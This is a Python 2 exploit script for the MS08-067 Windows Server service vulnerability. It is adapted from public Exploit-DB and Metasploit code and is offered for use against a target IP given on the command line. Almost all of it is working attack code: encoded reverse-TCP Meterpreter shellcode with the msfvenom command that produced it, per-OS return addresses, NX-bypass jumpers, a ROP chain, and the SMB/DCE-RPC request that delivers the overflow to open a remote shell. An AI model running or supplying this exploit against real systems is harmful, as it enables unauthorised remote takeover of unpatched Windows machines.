import struct
import time
import sys


from threading import Thread    #Thread is imported incase you would like to modify


try:

    from impacket import smb

    from impacket import uuid

    from impacket import dcerpc

    from impacket.dcerpc.v5 import transport


except ImportError, _:

    print 'Install the following library to make this script work'

    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'

    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'

    sys.exit(1)


print '#######################################################################'

print '#   MS08-067 Exploit'

print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'

print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'

print '#######################################################################\n'


#Reverse TCP shellcode from metasploit; port 443 IP 192.168.40.103; badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;
#Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)
#EXITFUNC=thread Important!
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
#shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
buf =  ""
buf += "\x90" * 62
buf += "\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\xad\xac\x92\xef\x83\xee\xfc\xe2\xf4\x51\x44"
buf += "\x10\xef\xad\xac\xf2\x66\x48\x9d\x52\x8b\x26\xfc\xa2"
buf += "\x64\xff\xa0\x19\xbd\xb9\x27\xe0\xc7\xa2\x1b\xd8\xc9"
buf += "\x9c\x53\x3e\xd3\xcc\xd0\x90\xc3\x8d\x6d\x5d\xe2\xac"
buf += "\x6b\x70\x1d\xff\xfb\x19\xbd\xbd\x27\xd8\xd3\x26\xe0"
buf += "\x83\x97\x4e\xe4\x93\x3e\xfc\x27\xcb\xcf\xac\x7f\x19"
buf += "\xa6\xb5\x4f\xa8\xa6\x26\x98\x19\xee\x7b\x9d\x6d\x43"
buf += "\x6c\x63\x9f\xee\x6a\x94\x72\x9a\x5b\xaf\xef\x17\x96"
buf += "\xd1\xb6\x9a\x49\xf4\x19\xb7\x89\xad\x41\x89\x26\xa0"
buf += "\xd9\x64\xf5\xb0\x93\x3c\x26\xa8\x19\xee\x7d\x25\xd6"
buf += "\xcb\x89\xf7\xc9\x8e\xf4\xf6\xc3\x10\x4d\xf3\xcd\xb5"
buf += "\x26\xbe\x79\x62\xf0\xc4\xa1\xdd\xad\xac\xfa\x98\xde"
buf += "\x9e\xcd\xbb\xc5\xe0\xe5\xc9\xaa\x53\x47\x57\x3d\xad"
buf += "\x92\xef\x84\x68\xc6\xbf\xc5\x85\x12\x84\xad\x53\x47"
buf += "\xbf\xfd\xfc\xc2\xaf\xfd\xec\xc2\x87\x47\xa3\x4d\x0f"
buf += "\x52\x79\x05\x85\xa8\xc4\x98\xe4\xad\x8e\xfa\xed\xad"
buf += "\xe2\xb2\x66\x4b\xc6\x82\xb9\xfa\xc4\x0b\x4a\xd9\xcd"
buf += "\x6d\x3a\x28\x6c\xe6\xe3\x52\xe2\x9a\x9a\x41\xc4\x62"
buf += "\x5a\x0f\xfa\x6d\x3a\xc5\xcf\xff\x8b\xad\x25\x71\xb8"
buf += "\xfa\xfb\xa3\x19\xc7\xbe\xcb\xb9\x4f\x51\xf4\x28\xe9"
buf += "\x88\xae\xee\xac\x21\xd6\xcb\xbd\x6a\x92\xab\xf9\xfc"
buf += "\xc4\xb9\xfb\xea\xc4\xa1\xfb\xfa\xc1\xb9\xc5\xd5\x5e"
buf += "\xd0\x2b\x53\x47\x66\x4d\xe2\xc4\xa9\x52\x9c\xfa\xe7"
buf += "\x2a\xb1\xf2\x10\x78\x17\x72\xf2\x87\xa6\xfa\x49\x38"
buf += "\x11\x0f\x10\x78\x90\x94\x93\xa7\x2c\x69\x0f\xd8\xa9"
buf += "\x29\xa8\xbe\xde\xfd\x85\xad\xff\x6d\x3a"
#removed this after the x00 %s
nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10
disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"
ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";
module_base = 0x6f880000
def generate_rop(rvas):
	gadget1="\x90\x5a\x59\xc3"
	gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]	
	gadget3="\xcc\x90\xeb\x5a"	
	ret=struct.pack('<L', 0x00018000)
	ret+=struct.pack('<L', rvas['call_HeapCreate']+module_base)
	ret+=struct.pack('<L', 0x01040110)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget1
	ret+=struct.pack('<L', rvas['mov [eax], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget2[0]
	ret+=gadget2[1]
	ret+=struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget2[2]
	ret+=struct.pack('<L', rvas['mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['add eax, 8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget3	
	return ret
class SRVSVC_Exploit(Thread):

    def __init__(self, target, os, port=445):
    	super(SRVSVC_Exploit, self).__init__()
    	#Changed __port to port
    	self.port = port
    	self.target = target
    	self.os = os

    def __DCEPacket(self):
    	if (self.os=='1'):
    		print 'Windows XP SP0/SP1 Universal\n'
    		ret = "\x61\x13\x00\x01"
    		jumper = nonxjmper % (ret, ret)
    	elif (self.os=='2'):
    		print 'Windows 2000 Universal\n'
    		ret = "\xb0\x1c\x1f\x00"
    		jumper = nonxjmper % (ret, ret)
    	elif (self.os=='3'):
    		print 'Windows 2003 SP0 Universal\n'
    		ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e
    		jumper = nonxjmper % (ret, ret)
    	elif (self.os=='4'):
    		print 'Windows 2003 SP1 English\n'
    		ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
    		ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
    		jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
    		disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL
    		jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)
    	elif (self.os=='5'):
    		print 'Windows XP SP3 French (NX)\n'
    		ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07 
    		disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2 
    		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
    	elif (self.os=='6'):
    		print 'Windows XP SP3 English (NX)\n'
    		ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07 
    		disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2 
    		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
    	elif (self.os=='7'):
    		print 'Windows XP SP3 English (AlwaysOn NX)\n'
    		rvasets = {'call_HeapCreate': 0x21286,'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e796,'pop ecx / ret':0x2e796 + 6,'mov [eax], ecx / ret':0xd296,'jmp eax':0x19c6f,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret':0x10a56,'mov [eax+0x10], ecx / ret':0x10a56 + 6,'add eax, 8 / ret':0x29c64}
    		jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.
    	else:
    		print 'Not supported OS version\n'
    		sys.exit(-1)
		print '[-]Initiating connection'

        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)

        self.__trans.connect()

        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target

        self.__dce = self.__trans.DCERPC_class(self.__trans)

        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))

        path ="\x5c\x00"+"ABCDEFGHIJ"*10 + buf +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"  + jumper + "\x00" * 2

        server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"

        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"

        return

    def run(self):

        self.__DCEPacket()

        self.__dce.call(0x1f, self.__stub) 
        time.sleep(10)
        print 'Exploit finish\n'



if __name__ == '__main__':
	try:
		target = sys.argv[1]
		os = sys.argv[2]
	except IndexError:
		print '\nUsage: %s <target ip>\n' % sys.argv[0]
		print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
		print 'Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n'
		sys.exit(-1)

current = SRVSVC_Exploit(target, os)
current.start()
